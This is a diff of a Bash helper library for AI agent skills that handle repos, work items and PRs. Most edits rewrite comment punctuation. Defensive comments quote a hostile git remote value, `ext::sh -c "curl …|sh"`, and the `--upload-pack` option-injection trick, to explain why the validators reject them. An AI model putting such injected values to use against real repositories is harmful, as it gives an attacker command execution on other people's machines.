@@ -2,7 +2,7 @@
 # Copyright (c) 2026 A.I. Hero, Inc.
 # All Rights Reserved.
 
-# hero-lib.sh — shared helpers for hero-skills.
+# hero-lib.sh: shared helpers for hero-skills.
 #
 # Sourced by skills, not executed. Every function here exists because the same
 # logic was previously inlined in two or more SKILL.md files and had already
@@ -19,7 +19,7 @@
 # Contract:
 #   - Values go to stdout. Human-readable notes go to stderr. A function that
 #     returns data never mixes the two, so a caller can parse stdout blindly.
-#   - Absence/failure is a non-zero return, never an exit — the caller decides
+#   - Absence/failure is a non-zero return, never an exit. The caller decides
 #     what is fatal. No function exits the calling shell.
 #   - Callers' shell state (cwd, variables) is never modified. Functions that
 #     need to cd do it inside a subshell.
@@ -39,7 +39,7 @@ hero_root() {
 # heading line, `## Fleet` or `### auth`), only that section is searched:
 # FLEET.md keeps one `### NAME` block per repo, so an unscoped read of `path`
 # would return whichever repo happens to come first. PARENT (an H2 line)
-# further requires an H3 block to sit under that H2 — the standard invites
+# further requires an H3 block to sit under that H2. The standard invites
 # prose after `## Repos`, and a `### auth` under `## Known issues` must not
 # answer for the repo row.
 #
@@ -49,13 +49,13 @@ hero_root() {
 # Prints the value (trimmed, comments stripped) on stdout.
 #
 # Returns: 0 found, 1 absent or present-but-empty, 2 rejected as unsafe (or a
-# BLOCK that is not a heading line — a bare name would silently read as
+# BLOCK that is not a heading line. A bare name would silently read as
 # "absent").
 #
 # HERO.md is repo content, so in a cloned repo it is attacker-controlled. Its
 # values flow into git and gh command lines across the skills. A value starting
 # with `-` is read by those tools as an OPTION rather than an argument, and
-# `git fetch origin --upload-pack=...` executes its value through a shell —
+# `git fetch origin --upload-pack=...` executes its value through a shell,
 # arbitrary command execution from nothing but a checked-in config file.
 # Rejecting here covers every call site at once, which is the whole point of
 # having one reader.
@@ -81,8 +81,8 @@ hero_md_field() {
     /^##+ / {
       h = $0; sub(/[[:space:]]+$/, "", h)
       # An H2 starts a new section. An H3 only matters when the caller asked
-      # for an H3 — so a `### x` under `## Fleet` does not end the Fleet
-      # section — and an H4 or deeper never opens or closes a block.
+      # for an H3, so a `### x` under `## Fleet` does not end the Fleet
+      # section, and an H4 or deeper never opens or closes a block.
       if (h ~ /^## /)                        { sec = h; inblk = (h == b) }
       else if (h ~ /^### / && b ~ /^### /)   inblk = (h == b && (p == "" || sec == p))
       next
@@ -137,7 +137,7 @@ hero_is_valid_branch() {
 # hero_is_valid_branch is to a branch name.
 #
 # HERO.md is attacker-controlled in a cloned repo, and hero_field only blocks a
-# leading `-` and control chars — NOT git's `ext::sh -c "..."` transport helper,
+# leading `-` and control chars, but NOT git's `ext::sh -c "..."` transport helper,
 # which git executes as a shell command. A `target-repo: ext::sh -c "curl …|sh"`
 # therefore sails through hero_field and runs on the victim's machine the moment
 # a skill feeds it to `git ls-remote`. This gate closes that at the one place
@@ -149,13 +149,13 @@ hero_is_valid_branch() {
 #   git@host:path     -> unchanged (scp-style ssh)
 #   an existing local directory -> unchanged
 #   none              -> unchanged (callers treat "disabled" uniformly)
-# Everything else — `::` transport helpers, file://, other URL schemes, a
-# non-existent bare path — is REJECTED: non-zero return, message on stderr.
+# Everything else (`::` transport helpers, file://, other URL schemes, a
+# non-existent bare path) is REJECTED: non-zero return, message on stderr.
 hero_normalize_repo_ref() {
   local ref="$1"
   [ -n "$ref" ] || return 1
   [ "$ref" = none ] && { printf 'none'; return 0; }
-  # `word::rest` is the transport-helper syntax (ext::, fd::, …) — the RCE path.
+  # `word::rest` is the transport-helper syntax (ext::, fd::, and so on), which is the RCE path.
   case "$ref" in
     *::*)
       echo "hero_normalize_repo_ref: refusing '$ref' — '::' transport-helper syntax runs a command" >&2
@@ -239,7 +239,7 @@ hero_default_branch_verbose() {
 }
 
 # Advisory staleness hint: warn when HERO.md is older than the config files
-# that shape it. Prints one note and always returns 0 — never blocks.
+# that shape it. Prints one note and always returns 0. It never blocks.
 #
 # This is the deliberate *fast subset* of scripts/check-hero-staleness.sh that
 # the daily-flow skills (push-pr, one-shot) want at Step 0. The two are meant
@@ -267,7 +267,7 @@ hero_check_staleness() {
 
 # ---------- fleet ----------------------------------------------------------
 #
-# A fleet is a folder of sibling checkouts with a FLEET.md at its top — the
+# A fleet is a folder of sibling checkouts with a FLEET.md at its top:
 # operator's local map of the repos they work across. It is unversioned and
 # never inside a repo; docs/FLEET-MD.md is the standard.
 #
@@ -276,8 +276,8 @@ hero_check_staleness() {
 # $HOME, which would hide every fleet beneath it.
 
 # Nearest ancestor (inclusive) of START holding FLEET.md, or return 1. A
-# directory holding HERO.md beside it is a repo that committed a FLEET.md —
-# repo content, not the operator's map — so it is passed over (stderr note)
+# directory holding HERO.md beside it is a repo that committed a FLEET.md:
+# repo content, not the operator's map, so it is passed over (stderr note)
 # and the walk continues upward.
 # shellcheck disable=SC2120  # in-file callers take the default; the tests pass START
 hero_fleet_root() { # [START]
@@ -331,7 +331,7 @@ hero_fleet_repo_field() { # NAME KEY [FLEET_ROOT]
 # resolves against the fleet root and defaults to ./NAME); GROUP is lowercased
 # and defaults to `none`, which means "lives here, not fleet"; PORT is digits
 # or empty when unclaimed. Columns 2 and 3 are never empty, so a caller's
-# `IFS=$'\t' read` is safe — do not add an optional column before PORT.
+# `IFS=$'\t' read` is safe. Do not add an optional column before PORT.
 #
 # A row that cannot be trusted is SKIPPED, not defaulted: a leading `-` or a
 # control character in a value, a non-numeric port, a name that is not
@@ -342,7 +342,7 @@ hero_fleet_repo_field() { # NAME KEY [FLEET_ROOT]
 # them back as BAD_ROW), and the function returns 3 when any row was skipped.
 #
 # Locals are rpath/rgroup/rport, never `path`: sourced from zsh, `local path`
-# empties the PATH-tied array and awk becomes "command not found" — an empty
+# empties the PATH-tied array and awk becomes "command not found", leaving an empty
 # registry with rc 0.
 hero_fleet_repos() { # [FLEET_ROOT]
   local root
@@ -405,9 +405,9 @@ hero_fleet_repos() { # [FLEET_ROOT]
 
 # Host port a checkout's dev compose file publishes: digits, `-` when there is
 # no compose file, `?` when there is one but no host port could be read (the
-# two are different findings — "not implemented" vs "unreadable"). Reads BOTH
+# two are different findings: "not implemented" versus "unreadable"). Reads BOTH
 # spellings, skips commented-out lines, and reads `HOST_PORT:-N`, a literal
-# `[HOST:]PUBLISHED:CONTAINER` mapping, or long-syntax `published:` — an
+# `[HOST:]PUBLISHED:CONTAINER` mapping, or long-syntax `published:`. An
 # earlier fleet reconcile grepped only `HOST_PORT` in `.yaml` and silently
 # reported two live repos as claiming no port at all. A multi-service file
 # publishes several ports (the database's first, typically); with RANGE
@@ -436,8 +436,8 @@ hero_compose_port() { # DIR [RANGE]
 
 # ---------- concurrent work --------------------------------------------------
 #
-# Several features build at once — worktree subagents here, other people
-# elsewhere — so a PR's head is routinely behind the default branch by the time
+# Several features build at once, with worktree subagents here and other people
+# elsewhere, so a PR's head is routinely behind the default branch by the time
 # it is reviewed, approved, or merged. A gate that judged a stale head judged
 # code that is not what will merge. Every skill that reviews, approves, or
 # merges rebases first, through this one function.
@@ -446,14 +446,14 @@ hero_compose_port() { # DIR [RANGE]
 # with --force-with-lease. Prints one line on stderr saying what happened.
 #
 # Returns: 0 already up to date, or rebased and pushed;
-#          1 the rebase conflicts — it is ABORTED, the branch is unchanged, and
+#          1 the rebase conflicts. It is ABORTED, the branch is unchanged, and
 #            the conflicting files are listed on stderr for the caller to STOP on;
 #          2 cannot proceed: dirty tree, detached HEAD, on the base itself, a
-#            fetch failure, or a push the lease refused (someone else pushed —
+#            fetch failure, or a push the lease refused (someone else pushed,
 #            fetch and re-run; never retry without the lease).
 #
 # Branch protection dismisses approvals on push, so a caller that has already
-# collected an approval must re-trigger it after a rebase — rebase BEFORE the
+# collected an approval must re-trigger it after a rebase, so rebase BEFORE the
 # approval, and only re-check (not re-rebase) between approval and merge.
 hero_rebase_on_base() { # BASE
   local base branch behind conflicts
@@ -489,7 +489,7 @@ hero_rebase_on_base() { # BASE
 
 # True when DIR (default $PWD) is a linked git worktree: its `.git` is a file
 # pointing into the primary checkout. ship-pr uses this to skip the
-# default-branch reset — the default branch is checked out in the primary, so
+# default-branch reset. The default branch is checked out in the primary, so
 # `git checkout main` here fails, and the worktree is the caller's to remove.
 hero_in_worktree() { # [DIR]
   local d
@@ -518,7 +518,7 @@ hero_exclude_path() {
 #   hero_exclude_add .plans/ .test-output/
 #
 # Fails PER ENTRY, not per call: returning only the last iteration's status
-# meant a failed append for entry 1 was swallowed when entry 2 succeeded —
+# meant a failed append for entry 1 was swallowed when entry 2 succeeded,
 # the store stayed un-ignored with nothing programmatically detectable.
 hero_exclude_add() {
   local exclude entry rc
@@ -553,7 +553,7 @@ HERO_SELF_REVIEW_MARKER='ai-hero:self-review'
 # The author filter is the whole point: the marker is a plain string anyone
 # can post, and without the filter a stranger's comment on a public repo lets
 # an unattended goal turn resume past self-review. Prints nothing and returns
-# non-zero when either API call fails — callers must branch on the rc, since
+# non-zero when either API call fails, so callers must branch on the rc, since
 # an empty count read as a number is zero, the value that means "no review".
 hero_self_review_count() { # PR_NUMBER
   local me
@@ -582,7 +582,7 @@ hero_store_path() { # [ROOT]
 }
 
 # Absolute path to the work-item store, created and git-ignored on first use.
-# A dot-directory: tool-private state, like `.beads/` — it keeps the repo root
+# A dot-directory: tool-private state, like `.beads/`. It keeps the repo root
 # clean and is far less likely to collide with a real project directory.
 #
 # One-time migration: the store was formerly `my-work/`, and before that
@@ -596,8 +596,8 @@ hero_work_store() {
 
   # Establish we can actually ignore the store BEFORE creating or migrating
   # anything. Doing it after meant a non-git directory got a store created and
-  # left un-ignored, with the function still returning 0. Check — and later
-  # write — against $root, not the cwd: with an explicit root argument, the
+  # left un-ignored, with the function still returning 0. Check, and later
+  # write, against $root rather than the cwd: with an explicit root argument, the
   # cwd may be a DIFFERENT repo, and the guard passing on the wrong repo
   # created an un-ignored store in $root while polluting the cwd's excludes.
   hero_exclude_path "$root" >/dev/null || {
@@ -606,7 +606,7 @@ hero_work_store() {
   }
 
   # A store that is a symlink redirects every later work-item write outside
-  # the checkout — into a directory the agent itself reads back. Refuse.
+  # the checkout, into a directory the agent itself reads back. Refuse.
   if [ -L "$store" ]; then
     echo "hero_work_store: refusing to use '$store' — it is a symlink" >&2
     return 1
@@ -615,7 +615,7 @@ hero_work_store() {
     # `[ -d ]` is true for a symlink to a directory, and `mv` renames the
     # LINK: a repo that commits `my-work -> ../../../.claude` (git preserves
     # symlinks on clone) would silently become `.plans -> ../../../.claude`.
-    # Refuse rather than migrate — but only when a migration would actually
+    # Refuse rather than migrate, but only when a migration would actually
     # happen; a stale legacy symlink next to a healthy `.plans/` must not
     # brick the store forever.
     if [ -L "$root/$legacy" ]; then
@@ -658,7 +658,7 @@ hero_work_store() {
 # Splits on the FIRST colon only and strips surrounding quotes. Splitting on
 # every ': ' truncated any value containing a colon; not stripping quotes made
 # `status: "done"` fail to equal `done`, which silently blocked every dependent
-# forever. hero_field already strips quotes — the two readers in this file must
+# forever. hero_field already strips quotes, so the two readers in this file must
 # agree on the same syntax.
 hero_item_field() {
   awk -v k="$2" '
@@ -683,12 +683,12 @@ hero_item_covers() { hero_item_list_field "$1" covers; }
 # Print a frontmatter list field's entries, one per line.
 #
 # Handles BOTH YAML forms. Only the inline form was parsed before, so a block
-# sequence —
+# sequence,
 #
 #   depends_on:
 #     - 99
 #
-# — yielded an empty value, the readiness loop never ran, and the item was
+# That yielded an empty value, the readiness loop never ran, and the item was
 # reported READY despite depending on work that does not exist. Silently: there
 # was no `d` for the readiness loop's existence check to flag as missing.
 hero_item_list_field() {
@@ -699,7 +699,7 @@ hero_item_list_field() {
       v = $0; sub(/^[^:]*: */, "", v); sub(/ *#.*/, "", v)
       gsub(/[][,]/, " ", v)
       n = split(v, parts, /[[:space:]]+/)
-      # Strip surrounding quotes per entry, mirroring the block branch below —
+      # Strip surrounding quotes per entry, mirroring the block branch below,
       # quoting is handled here, in the parser, not by the id normalizer.
       for (i = 1; i <= n; i++) {
         p = parts[i]
@@ -731,7 +731,7 @@ hero_item_status() {
   printf '%s' "${s:-new}"
 }
 
-# Map a kind to its CLASS — the class picks the status enum (see the table on
+# Map a kind to its CLASS. The class picks the status enum (see the table on
 # hero_ready_items). Prints the class; prints `unknown` and warns for a kind
 # not in the table. Both of hero_ready_items' loops call this so the kind list
 # exists once: a second copy in the terminal-status pass is how a fourth
@@ -757,7 +757,7 @@ hero_item_class() {
 
 # Messages in a store's mailbox (docs/MESSAGES.md) by state. With no second
 # argument, UNREAD: inbox/*.md whose `status:` is `new`, absent (the default
-# for a missing line, as for items), or any word outside the enum — an
+# for a missing line, as for items), or any word outside the enum. An
 # unrecognized status must count as unread, not as settled, or a sender's
 # typo hides a message. `claimed` counts messages a session took and never
 # released; the standard's takeover rule needs that number visible. A store
@@ -784,7 +784,7 @@ hero_inbox_count() { # STORE [claimed]
   printf '%s' "$n"
 }
 
-# A suspended item's `awaiting:` ids, one per line, in both YAML forms —
+# A suspended item's `awaiting:` ids, one per line, in both YAML forms:
 # the same two-form trap hero_item_deps documents: the block form
 # (`awaiting:` then indented `- id` lines) is what a careful author writes,
 # and a single-line reader prints it as empty, which renders a wait as one
@@ -812,7 +812,7 @@ hero_item_awaiting() { # ITEM_FILE
 # A message id with real entropy (docs/MESSAGES.md). Hash-named, never
 # numbered: `.plans/` ids are a sequential integer namespace, and a sender
 # allocating an id inside the RECIPIENT's namespace races that repo's own
-# allocation — which surfaces as a duplicate id and a silent mis-resolution,
+# allocation, which surfaces as a duplicate id and a silent mis-resolution,
 # not a failure.
 hero_msg_id() {
   local h
@@ -839,7 +839,7 @@ hero_is_msg_id() { # ID
 
 # Live messages in a store's inbox matching FROM and ABOUT, as paths, one per
 # line. This is the dedupe probe every sender runs BEFORE depositing: the key
-# is (from, about), never msg_id, which differs by construction — so a resumed
+# is (from, about), never msg_id, which differs by construction, so a resumed
 # sender that skips this re-sends and the recipient does the work twice.
 #
 # Returns 1 when nothing matches, so `if hero_msg_find ...` reads as "already
@@ -847,7 +847,7 @@ hero_is_msg_id() { # ID
 # "not sent yet".
 #
 # ABOUT is required and may not be empty. An absent `about:` reads as "" too,
-# so an empty probe matches every about-less message from that sender — two
+# so an empty probe matches every about-less message from that sender, so two
 # unrelated asks from one repo would dedupe against each other and the second
 # would never be sent. A sender with no local item passes a subject token
 # instead (docs/MESSAGES.md, Sending step 2).
@@ -860,7 +860,7 @@ hero_msg_find() { # STORE FROM ABOUT
   for f in "$1"/inbox/*.md; do
     [ -f "$f" ] || continue
     if [ ! -r "$f" ]; then
-      # Skipping in silence would return "not sent yet" and send a duplicate —
+      # Skipping in silence would return "not sent yet" and send a duplicate,
       # the exact double-dispatch this probe exists to prevent.
       echo "hero_msg_find: cannot read $f — probe is incomplete" >&2
       continue
@@ -902,7 +902,7 @@ hero_msg_find() { # STORE FROM ABOUT
 #
 # Atomicity is the whole reason this is a function: a recipient globbing
 # inbox/*.md can read a file mid-write, so the content is written to a temp
-# name IN THE SAME DIRECTORY and `mv`d into place — rename is atomic on one
+# name IN THE SAME DIRECTORY and `mv`d into place. Rename is atomic on one
 # filesystem, a direct write is not, and a torn read of a message is a request
 # acted on in half.
 #
@@ -954,7 +954,7 @@ hero_msg_deposit() { # TARGET_STORE MSG_ID BODY_FILE
 #
 # Mechanical on purpose. The other admission criteria are judgments an agent
 # makes in the same context window as the content that suggested the work, and
-# that content is untrusted — a persuasive paragraph can produce an item that
+# that content is untrusted, and a persuasive paragraph can produce an item that
 # honestly seems to serve a DoD line. It cannot move the parent's declared
 # paths, so this is the criterion that still holds when the judgment is the
 # thing under attack. That only stays true if "within" is computed rather than
@@ -1002,7 +1002,7 @@ hero_path_forbidden() { # PATH
 
 # A post-merge deploy check that could not be answered without waiting.
 #
-# The check is advisory — it never un-merges anything — so blocking a session
+# The check is advisory and never un-merges anything, so blocking a session
 # on it buys nothing and costs a sleep per merged PR, multiplied by a goal's
 # concurrency. Instead the merge commit is recorded here and probed by the
 # next thing that runs in this repo, which pays no wait at all. Same shape as
@@ -1014,14 +1014,14 @@ hero_path_forbidden() { # PATH
 # Serialize a read-modify-write on the list. `mkdir` is the portable atomic
 # test-and-set; `flock` is absent on macOS. wayfare runs `concurrency`
 # subagents that share one list (hero_work_store resolves every worktree to
-# the primary), and one drains at Step 2a while another appends at Step 7e —
+# the primary), and one drains at Step 2a while another appends at Step 7e,
 # so an unlocked rewrite silently drops whatever was appended between its read
 # and its rename, which is a DEGRADED deploy nobody will ever see.
 hero_pending_lock() { # FILE [TIMEOUT_S]
   local lock="$1.lock" waited=0 limit="${2:-10}" owner
   while ! mkdir "$lock" 2>/dev/null; do
-    # A lock older than a minute outlived any legitimate holder — this guards
-    # a grep and a rename, not a network call — and a crashed session must not
+    # A lock older than a minute outlived any legitimate holder. This guards
+    # a grep and a rename, not a network call, and a crashed session must not
     # wedge every future drain.
     owner=$(find "$lock" -maxdepth 0 -mmin +1 2>/dev/null)
     [ -n "$owner" ] && { rm -rf "$lock"; continue; }
@@ -1036,20 +1036,20 @@ hero_pending_unlock() { # FILE
 }
 
 # Queue a merge whose deploy probe was deferred. Appending a SHA already
-# present is a no-op — a re-run of the same merge must not queue it twice.
+# present is a no-op. A re-run of the same merge must not queue it twice.
 hero_deploy_pending_add() { # STORE SHA PR
   local f="$1/.deploy-pending"
   [ -d "${1:-}" ] || { echo "hero_deploy_pending_add: no store at '${1:-}'" >&2; return 1; }
   # 40-hex, matching what the rest of the store means by a SHA. An abbreviated
-  # sha would be added but never cleared — hero_deploy_pending_clear matches
-  # the full field — so the entry would be re-probed and re-reported forever.
+  # sha would be added but never cleared, because hero_deploy_pending_clear matches
+  # the full field, so the entry would be re-probed and re-reported forever.
   case "$2" in
     ????????????????????????????????????????) ;;
     *) echo "hero_deploy_pending_add: '$2' is not a 40-character commit sha" >&2; return 1 ;;
   esac
   case "$2" in *[!0-9a-f]*) echo "hero_deploy_pending_add: '$2' is not lowercase hex" >&2; return 1 ;; esac
   # The PR is what the drain names in its verdict. Blank is representable and,
-  # because dedupe is on the SHA alone, permanent — a later add carrying the
+  # because dedupe is on the SHA alone, permanent: a later add carrying the
   # number is a no-op.
   case "${3:-}" in
     '') echo "hero_deploy_pending_add: PR is required — the drain reports the verdict against it" >&2; return 1 ;;
@@ -1096,7 +1096,7 @@ hero_deploy_pending_clear() { # STORE SHA
   hero_pending_lock "$f" || return 1
   tmp="$f.$$.tmp"
   grep -v "^$2	" "$f" > "$tmp"; rc=$?
-  # grep's rc 1 is "every line matched, nothing remains" — the normal empty
+  # grep's rc 1 is "every line matched, nothing remains", the normal empty
   # case. rc 2+ is an ERROR, and treating it as "nothing remains" (or reading
   # a short write as one) unlinks a list of never-probed checks.
   if [ "$rc" -gt 1 ]; then
@@ -1122,7 +1122,7 @@ hero_deploy_pending_clear() { # STORE SHA
 hero_local_skills() { # ROOT [HOOK]
   local f name hook real seen
   seen=" "
-  # zsh aborts on an unmatched glob, and most repos have no .claude/skills/ —
+  # zsh aborts on an unmatched glob, and most repos have no .claude/skills/,
   # that must be an empty listing with rc 0, not an error on every Step 0.
   setopt localoptions nullglob 2>/dev/null || true
   for f in "$1"/.claude/skills/*/SKILL.md; do
@@ -1146,7 +1146,7 @@ hero_local_skills() { # ROOT [HOOK]
 
 # Normalize a work-item id for comparison: all-digit ids (the standard form)
 # drop leading zeros so `007` equals `7`; anything else lowercases and
-# compares verbatim rather than aborting — the old `$((10#$id))` arithmetic
+# compares verbatim rather than aborting. The old `$((10#$id))` arithmetic
 # was a FATAL error on any non-digit and silently blanked the whole listing.
 # Quote-stripping is the frontmatter readers' job, not this function's.
 hero_norm_id() {
@@ -1158,54 +1158,54 @@ hero_norm_id() {
 
 # Print one line per work-item:  STATE  file — title
 # A blocked row whose dependency does not exist anywhere in the store gets a
-# trailing ` [missing dep: ID…]` annotation — that reference can NEVER be
+# trailing ` [missing dep: ID…]` annotation, because that reference can NEVER be
 # satisfied, which is different from ordinary waiting.
 #
 # STATE is one of:
 #   READY    not done, and every depends_on target is done
 #   blocked  not done, but a dependency is unmet or unresolvable
-#   plan     status is planning — still being shaped; a HUMAN marks it todo
+#   plan     status is planning: still being shaped; a HUMAN marks it todo
 #            (`ready` for a build kind)
-#   active   status is in-progress — someone is already on it
+#   active   status is in-progress: someone is already on it
 #   done     completed
-#   new      status is new (or absent): created, not yet triaged. Never READY —
+#   new      status is new (or absent): created, not yet triaged. Never READY,
 #            nobody has decided this should be worked on
-#   backlog  build kinds (and unrecognized ones) — status is todo: on the
+#   backlog  build kinds (and unrecognized ones) with status todo: on the
 #            roadmap, not yet planned; annotated `[deps unmet]` when a
 #            dependency isn't done
-#   review   build kinds only — status is reviewing: PR open, awaiting merge
-#   feedback feedback kinds only — status is todo or queued: a divergence
+#   review   build kinds only, status reviewing: PR open, awaiting merge
+#   feedback feedback kinds only, status todo or queued: a divergence
 #            written but not yet landed upstream. Never READY: a feedback item
 #            is DELIVERED, never built, so handing one to one-shot is wrong
-#   goal     kind: goal only — status is todo: approved, waiting to run. Never
+#   goal     kind: goal only, status todo: approved, waiting to run. Never
 #            READY: a goal is a container for features, and one-shot builds
 #            features. `wayfare next` selects goals by kind instead
-#   invalid  no usable id, OR an unrecognized status — either way the item
+#   invalid  no usable id, OR an unrecognized status. Either way the item
 #            cannot participate in dependency order and is never handed out READY
 #
 # Kind picks a CLASS, and the class picks the status enum:
 #
-#   plain     '' / work-order / hardening — new | planning | todo | in-progress | done.
+#   plain     '' / work-order / hardening: new | planning | todo | in-progress | done.
 #             LEGACY: every producer now writes a build kind. The arm stays so
 #             existing stores keep listing; dropping it would demote every
 #             pre-rule item to backlog with a stderr line as the only trace
-#   build     feature / architecture / polish / security — new | todo | planning | ready |
+#   build     feature / architecture / polish / security: new | todo | planning | ready |
 #             implementing | reviewing | done, mapped here as
 #             new | backlog | plan | READY-eligible |
 #             active | review | done. For a build kind, `ready` (not `todo`) is
 #             the state eligible to become READY: `todo` means "identified,
 #             unplanned", and handing an unplanned one to one-shot would skip
 #             planning entirely
-#   feedback  design-feedback / architecture-feedback / design-system-feedback —
+#   feedback  design-feedback / architecture-feedback / design-system-feedback:
 #             new | todo | queued | delivered | rejected, mapped as new | feedback
 #             | feedback | done | done
-#   goal      goal — new | todo | active | done, mapped as new | goal | active |
+#   goal      goal: new | todo | active | done, mapped as new | goal | active |
 #             done. Spans several features via `covers:`; its own DoD is what
 #             the goal loop checks against
 #
 # Plain items keep the original enum; `ready`/`implementing`/`reviewing` on a
 # plain item stay invalid (loud). An unrecognized kind rides the plain enum with
-# READY downgraded to backlog — see the class gate for why that is the only
+# READY downgraded to backlog. See the class gate for why that is the only
 # reading safe under both failure modes.
 #
 # `done` rows are PRINTED, not hidden. Callers need to see them: one-shot's
@@ -1214,19 +1214,19 @@ hero_norm_id() {
 # duplicating it. Filtering them out silently defeated both.
 #
 # `active` is separated from READY so two sessions cannot both pick up the same
-# in-flight item — one-shot marks an item in-progress (`implementing` for a
+# in-flight item. one-shot marks an item in-progress (`implementing` for a
 # feature) before its first edit specifically to prevent that, and folding it
 # into READY undid it.
 #
 # `planning` is never READY regardless of dependencies: the item is still being
 # shaped and awaits a human ready-mark. Skills that emit plain items write them
 # as `planning`; only the user's explicit say-so flips one to `todo` (`ready`
-# for a build kind) — without this state, freshly emitted items were
+# for a build kind). Without this state, freshly emitted items were
 # handed straight to one-shot. Wayfare emits features as `todo`, which for a
-# feature means backlog — still never READY.
+# feature means backlog, and still never READY.
 #
 # NOTE: readiness is a claim about DEPENDENCIES, not about the codebase. An item
-# stays READY after its work lands until someone marks it done — consumers must
+# stays READY after its work lands until someone marks it done, so consumers must
 # verify against the repo before acting.
 #
 # Runs in a subshell: it cds, and leaking that into a sourced caller's shell
@@ -1237,13 +1237,13 @@ hero_ready_items() (
   cd "$store" 2>/dev/null || { echo "hero_ready_items: no store at ${store}" >&2; return 1; }
   # zsh errors out on an unmatched glob (bash leaves it literal for the
   # `[ -e ]` guard to skip), so an EMPTY store aborted with a raw "no matches
-  # found" and rc=1 — indistinguishable from a missing store. nullglob makes
+  # found" and rc=1, indistinguishable from a missing store. nullglob makes
   # it an empty listing in both shells.
   setopt localoptions nullglob 2>/dev/null || true
 
   # Collect every id and the done subset. Ids are integers by convention, but
   # comparison is string-tolerant (hero_norm_id), so the ids rejected here are
-  # EMPTY ones and ids containing whitespace — whitespace would inject extra
+  # EMPTY ones and ids containing whitespace, because whitespace would inject extra
   # tokens into the space-delimited sets below, letting a dep on a NONEXISTENT
   # id resolve (and even count as done) with no warning at all. A malformed
   # hand-written item must not erase or corrupt the whole listing.
@@ -1269,7 +1269,7 @@ hero_ready_items() (
     # The same alphabet gate the listing loop applies, applied BEFORE anything
     # is admitted to done_ids. Without it an item the listing prints as
     # `invalid` (`kind: foo bar`, `status: done`) still unblocked its
-    # dependents — invisible on the listing, live in the dependency order.
+    # dependents, invisible on the listing but live in the dependency order.
     state=$(hero_item_status "$f")
     kind=$(hero_item_field "$f" kind | tr '[:upper:]' '[:lower:]')
     case "$state$kind" in *[!a-z-]*) continue ;; esac
@@ -1309,7 +1309,7 @@ EOF
     title=$(hero_item_field "$f" title)
     kind=$(hero_item_field "$f" kind | tr '[:upper:]' '[:lower:]')
     # Gate the ALPHABET before the table: both values come from hand-editable
-    # frontmatter, and the kind-keyed patterns below anchor on a `:` join — a
+    # frontmatter, and the kind-keyed patterns below anchor on a `:` join, and a
     # smuggled colon (`status: x:todo`) would otherwise match the `*:todo` arm
     # and walk an unrecognized status straight into READY, the exact silent
     # fall-through the invalid arm exists to stop. Every legal keyword is
@@ -1329,7 +1329,7 @@ EOF
       ''|*[[:space:]]*) echo "invalid $f — $title"; continue ;;
     esac
     # A planned build item outside every open goal is invisible to `wayfare
-    # next` — it walks goals, never items — so it sits READY forever unless
+    # next`, which walks goals and never items, so it sits READY forever unless
     # someone runs `do N` by hand. Sync groups every planned item; an
     # uncovered one means that pass was skipped or cut short, and nothing
     # else reports it. Warn on stderr only: the row itself is still correct.
@@ -1348,31 +1348,31 @@ EOF
     # lifecycle rename still list, not invalidate.
     row=READY
     # Every arm names its classes. A `*:` wildcard here would let a feedback
-    # item at `in-progress` print `active` — byte-identical to a feature
+    # item at `in-progress` print `active`, byte-identical to a feature
     # mid-build, and the row carries no kind, so a goal turn's tier 1 would
     # hand it to one-shot. `*:new` is the one exception: new is in every enum.
     case "$class:$state" in
       *:new)                            echo "new     $f — $title"; continue ;;
       plain:done|build:done|goal:done|unknown:done)
                                         echo "done    $f — $title"; continue ;;
-      # Delivered and rejected are both TERMINAL and both frozen — a rejection
+      # Delivered and rejected are both TERMINAL and both frozen. A rejection
       # is kept on purpose, because "we raised this and they said no" is the
       # history that stops it being raised again next quarter.
       feedback:delivered|feedback:rejected) echo "done    $f — $title"; continue ;;
       # Open feedback: written, not yet landed upstream. Its own row word, so
-      # the backlog count is a scan rather than a judgment about prose — this
+      # the backlog count is a scan rather than a judgment about prose. This
       # is the return channel's only backlog surface, and a miscount of zero is
       # indistinguishable from "no feedback exists".
       feedback:todo|feedback:queued)    echo "feedback $f — $title"; continue ;;
       # A goal is a container for features, not a unit of work. It is never
       # READY, because READY means "hand this to one-shot" and one-shot builds
-      # features. `wayfare next` selects goals by kind and `do GOAL_ID` takes one by id — never off the READY tier.
+      # features. `wayfare next` selects goals by kind and `do GOAL_ID` takes one by id, never off the READY tier.
       goal:todo)                        echo "goal    $f — $title"; continue ;;
       goal:active|build:implementing|build:in-progress|plain:in-progress|unknown:in-progress)
                                         echo "active  $f — $title"; continue ;;
       build:reviewing)                  echo "review  $f — $title"; continue ;;
       # Suspended: waiting on a sibling repo's reply (docs/MESSAGES.md). Never
-      # READY and never in done_ids — a dependent stays blocked while the
+      # READY and never in done_ids, so a dependent stays blocked while the
       # question is open. The row carries the ids and the date it suspended
       # (`suspended_at:`), because a wait with no age is indistinguishable
       # from a healthy one; a suspended item with NO awaiting ids can never be
@@ -1392,7 +1392,7 @@ EOF
       *)
         # An UNRECOGNIZED status must never fall through to the READY path. The
         # display label is `plan` while the keyword is `planning`, so `status:
-        # plan` — or any typo like `plannig` — is an easy hand/model error that
+        # plan`, or any typo like `plannig`, is an easy hand or model error that
         # would otherwise be handed straight to one-shot with no human
         # ready-mark, silently defeating the gate the planning state exists to
         # enforce. Treat it like a rejected id: name it loudly, never READY.
@@ -1419,7 +1419,7 @@ EOF
         *)
           # A dangling reference blocks FOREVER, silently, unless it is named:
           # nothing will ever mark a nonexistent id done. Say so on both the
-          # listing (so the model sees it) and stderr (so a human does) — and
+          # listing (so the model sees it) and stderr (so a human does), and
           # say it with the RAW value as written in the file, so grepping the
           # store for the printed token actually finds it.
           echo "hero_ready_items: $f depends_on '$raw', which no item carries — blocked until the reference is fixed" >&2
@@ -1452,7 +1452,7 @@ EOF
 
 # ---------- branch naming ---------------------------------------------------
 #
-# Deriving the name itself is a *model* task, not a shell one — it reads a diff
+# Deriving the name itself is a *model* task, not a shell one. It reads a diff
 # or a description and summarizes. What lives here is the policy the model
 # applies, in one place, because it was previously stated in both push-pr and
 # one-shot and the two had already drifted (one listed a `test/` prefix, the
